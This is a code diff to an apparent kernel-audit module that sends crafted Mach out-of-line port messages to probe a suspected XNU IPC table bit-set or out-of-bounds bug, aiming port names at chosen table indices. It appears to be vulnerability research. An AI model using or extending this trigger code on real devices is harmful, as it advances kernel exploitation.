@@ -5,6 +5,32 @@
 #import <mach/message.h>
 #import <mach_debug/ipc_info.h>
 
+// Per ollie: the OOL backing buffer must pass ipc_kmsg_copyin_ool_ports_descriptor
+// in full, otherwise copyin rejects on the first garbage name and the receive-side
+// ipc_port_translate_receive path is never reached. Cycle valid send rights or
+// MACH_PORT_NULL (legal in OOL arrays) across the whole array.
+static void fill_ool_ports_buffer(mach_port_t *buf, uint32_t ool_count,
+                                  const mach_port_t *real_ports, uint32_t real_count) {
+    for (uint32_t i = 0; i < ool_count; i++) {
+        buf[i] = (real_count > 0) ? real_ports[i % real_count] : MACH_PORT_NULL;
+    }
+}
+
+// Per ollie: churned ports may have lost their send right; MACH_SEND_INVALID_RIGHT
+// on a canary ping then looks like a bit-set hit. Guarantee the right first.
+static kern_return_t ensure_send_right(mach_port_t port) {
+    mach_port_type_t ptype = 0;
+    kern_return_t kr = mach_port_type(mach_task_self(), port, &ptype);
+    if (kr != KERN_SUCCESS) return kr;
+    if ((ptype & MACH_PORT_TYPE_SEND) == 0) {
+        if (ptype & MACH_PORT_TYPE_RECEIVE) {
+            return mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+        }
+        return KERN_INVALID_RIGHT;
+    }
+    return KERN_SUCCESS;
+}
+
 @interface KPAuditIPCModule ()
 @property (nonatomic, copy) NSString *identifier;
 @property (nonatomic, copy) NSString *title;
@@ -156,19 +182,25 @@
         return @{@"status": @"BASELINE_OUTSIDE_BOUNDED_RANGE", @"initial": initial};
     }
 
-    uint32_t targets[] = {
-        initialSize - 1, initialSize, initialSize + 1,
-        initialSize * 2 - 1, initialSize * 2, initialSize * 2 + 1,
-    };
+    // Per ollie: is_table grows monotonically (170->256->341->512) and never
+    // shrinks, so adjacent points of a crossed boundary cannot be re-probed in
+    // one ipc_space. Each round targets the CURRENT table_size fill point and
+    // records growth wherever it occurs (allocate loop OR send/recv insert).
     NSMutableArray *rounds = [NSMutableArray array];
-    for (size_t round = 0; round < sizeof(targets) / sizeof(targets[0]); round++) {
-        uint32_t target = targets[round];
+    for (size_t round = 0; round < 6; round++) {
         NSDictionary *before = [self portSpaceBasicSnapshot];
+        if ([before[@"kr"] intValue] != KERN_SUCCESS) {
+            [rounds addObject:@{@"round": @(round), @"before": before,
+                                @"status": @"INFO_FAILED"}];
+            break;
+        }
         uint32_t beforeInUse = [before[@"table_inuse"] unsignedIntValue];
-        if ([before[@"kr"] intValue] != KERN_SUCCESS || target <= beforeInUse) {
-            [rounds addObject:@{@"target_inuse": @(target), @"before": before,
+        uint32_t currentSize = [before[@"table_size"] unsignedIntValue];
+        uint32_t target = currentSize;
+        if (target <= beforeInUse) {
+            [rounds addObject:@{@"round": @(round), @"target_inuse": @(target), @"before": before,
                                 @"status": @"TARGET_BELOW_BASELINE_OR_INFO_FAILED"}];
-            continue;
+            break;
         }
 
         NSMutableArray *allocated = [NSMutableArray array];
@@ -192,24 +224,34 @@
             if (dkr != KERN_SUCCESS) destroyFailures++;
         }
         NSDictionary *afterFree = [self portSpaceBasicSnapshot];
+        uint32_t sizeBefore = [before[@"table_size"] unsignedIntValue];
+        uint32_t sizeAlloc = [afterAllocation[@"table_size"] unsignedIntValue];
+        uint32_t sizeFree = [afterFree[@"table_size"] unsignedIntValue];
+        BOOL grewAlloc = sizeAlloc > sizeBefore;
+        BOOL grewDuringSendRecv = sizeFree > sizeAlloc;
         [rounds addObject:@{
-            @"target_inuse": @(target), @"before": before,
+            @"round": @(round), @"target_inuse": @(target), @"boundary": @(currentSize),
+            @"before": before,
             @"allocated": @(allocated.count), @"last_allocate_kr": @(lastAllocationKR),
             @"allocate_failures": @(allocationFailures),
             @"after_allocate": afterAllocation,
-            @"table_grew": @([afterAllocation[@"table_size"] unsignedIntValue] >
-                             [before[@"table_size"] unsignedIntValue]),
+            @"table_grew": @(grewAlloc || grewDuringSendRecv),
+            @"grew_during_sendrecv": @(grewDuringSendRecv),
             @"send_kr": message[@"send_kr"] ?: @(-1),
             @"recv_kr": message[@"recv_kr"] ?: @(-1),
             @"recv_desc_count": message[@"recv_desc_count"] ?: @0,
             @"destroy_failures": @(destroyFailures), @"after_free": afterFree,
             @"inuse_restored": @([afterFree[@"table_inuse"] unsignedIntValue] == beforeInUse),
         }];
+        if (!grewAlloc && !grewDuringSendRecv) {
+            break; // boundary not crossed this way; later rounds would repeat it
+        }
     }
     return @{
-        @"shape": @"ipc_entry_grow_table allocate/free + one-descriptor send/receive",
+        @"shape": @"ipc_entry_grow_table allocate/free + one-descriptor send/receive (per live boundary)",
         @"initial": initial, @"rounds": rounds,
         @"oracle": @"table size/inuse and kr values only; accepted messages do not prove OOB or UAF",
+        @"note": @"is_table never shrinks; send/recv itself allocates a slot and can cross the boundary before after_free (ollie)",
     };
 }
 
@@ -280,7 +322,9 @@
 // validation boundary. The allocation always covers `count`; no userspace OOB
 // read or kernel OOB transfer is inferred from an accepted message.
 - (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
-    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:YES];
+    // Default path: fully valid buffer (ollie). useSpray:YES is only the
+    // deliberately-invalid-name control used by the labeled threshold probe.
+    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:NO];
 }
 
 - (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight useSpray:(BOOL)useSpray {
@@ -293,10 +337,15 @@
     // Allocate enough entries to cover max sweep count (4096) plus padding
     uint32_t allocEntries = 4096 + 32;
     mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
-    // Fill first 'real' entries with valid ports, rest with INVALID names
-    // (MACH_PORT_NULL is legal in OOL arrays — kernel accepts it without error)
-    for (uint32_t i = 0; i < allocEntries; i++) {
-        ports[i] = (i < real) ? sendRight : (mach_port_t)(0xdeadbee0 + i);
+    if (useSpray) {
+        // Deliberate invalid-name control: first `real` entries valid, tail garbage.
+        // Measures where ipc_kmsg_copyin_ool_ports_descriptor rejects names — NOT a count limit.
+        for (uint32_t i = 0; i < allocEntries; i++) {
+            ports[i] = (i < real) ? sendRight : (mach_port_t)(0xdeadbee0 + i);
+        }
+    } else {
+        // Clean fill (ollie): every entry passes copyin so crafted counts reach translate_receive.
+        fill_ool_ports_buffer(ports, allocEntries, &sendRight, 1);
     }
 
     uint8_t *buf = calloc(1, total);
@@ -420,7 +469,9 @@
     [report appendString:@"\n--- OOL validation threshold (64..96 valid/invalid entries) ---\n"];
     uint32_t lastOK = 0, threshold = 0, acceptedOversized = 0;
     for (uint32_t c = 64; c <= 96; c++) {
-        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
+        // useSpray:YES on purpose — invalid-name control (copyin name validation),
+        // not a count clamp. The count sweep above now uses the clean fill.
+        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port useSpray:YES];
         [report appendFormat:@"%@\n", r];
         [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_desc_count=%@",
                        c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_desc_count"]]];
@@ -473,13 +524,17 @@
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &moveRx);
     mach_port_insert_right(mach_task_self(), moveRx, moveRx, MACH_MSG_TYPE_MAKE_SEND);
 
+    mach_port_t auxSend = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &auxSend);
+    mach_port_insert_right(mach_task_self(), auxSend, auxSend, MACH_MSG_TYPE_MAKE_SEND);
+
     memset(&moveMsg, 0, sizeof(moveMsg));
     moveMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
     moveMsg.hdr.msgh_size = sizeof(moveMsg);
     moveMsg.hdr.msgh_remote_port = port;
     moveMsg.hdr.msgh_id = 0x112514;
     moveMsg.body.msgh_descriptor_count = 2;
-    moveMsg.desc[0].name = pcanary[0];
+    moveMsg.desc[0].name = auxSend;
     moveMsg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
     moveMsg.desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
     moveMsg.desc[1].name = moveRx;
@@ -516,6 +571,7 @@
 
     for (int i = 0; i < PRECISE_N; i++) mach_port_destroy(mach_task_self(), pcanary[i]);
     mach_port_destroy(mach_task_self(), moveRx);
+    mach_port_destroy(mach_task_self(), auxSend);
     // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
     // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
     [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
@@ -570,14 +626,26 @@
     // XNU port names: (index << 8) | generation. w2 = index = name >> 8.
     // If w2 = name>>8, bit-set at table[name>>8] hits this port's entry.
     [report appendString:@"\n--- targeted bit-set: name>>8 as w2 ---\n"];
-    int targeted = 0, targetedDead = 0;
+    int targeted = 0, targetedDead = 0, oolSendFails = 0, skippedNoSendRight = 0;
     for (int i = 0; i < CANARY_N; i += 4) {
         if (canaryAlive[i] != 1) continue;
         uint32_t name = (uint32_t)canary[i];
         uint32_t w2 = name >> 8;  // XNU index component
         if (w2 == 0) continue;
+        // Per ollie: churned ports may have no send right; that failure is
+        // lifecycle noise, not a bit-set signal. Ensure the right first.
+        kern_return_t esr = ensure_send_right(canary[i]);
+        if (esr != KERN_SUCCESS) {
+            skippedNoSendRight++;
+            [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u SKIPPED ensure_send_right kr=%d",
+                           w2, canary[i], esr]];
+            continue;
+        }
         NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
         targeted++;
+        if ([tr[@"send_kr"] intValue] != KERN_SUCCESS) {
+            oolSendFails++;
+        }
         [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
                        w2, canary[i], tr[@"send_kr"], tr[@"recv_kr"]]];
 
@@ -593,14 +661,15 @@
                                      ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
         if (skr != KERN_SUCCESS) {
             targetedDead++;
-            [report appendFormat:@"TARGETED SEND FAILURE: port=%u name=%u after w2=%u (send_kr=%d)\n",
-             canary[i], w2, w2, skr];
+            [report appendFormat:@"TARGETED CANARY PING FAILURE: port=%u w2=%u after trigger (send_kr=%d)\n",
+             canary[i], w2, skr];
         } else {
             mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
         }
     }
-    [report appendFormat:@"targeted result: %d attempts, %d send failures\n", targeted, targetedDead];
-    if (targetedDead > 0) {
+    [report appendFormat:@"targeted result: %d attempts, %d ool send failures, %d canary ping failures, %d skipped (no send right)\n",
+     targeted, oolSendFails, targetedDead, skippedNoSendRight];
+    if (targetedDead > 0 || oolSendFails > 0) {
         [report appendString:@"Send failures are unverified lifecycle signals; w2 source and bit-set attribution are not proven.\n"];
     } else {
         [report appendString:@"No targeted send-status delta observed; this does not identify or exclude an index source.\n"];
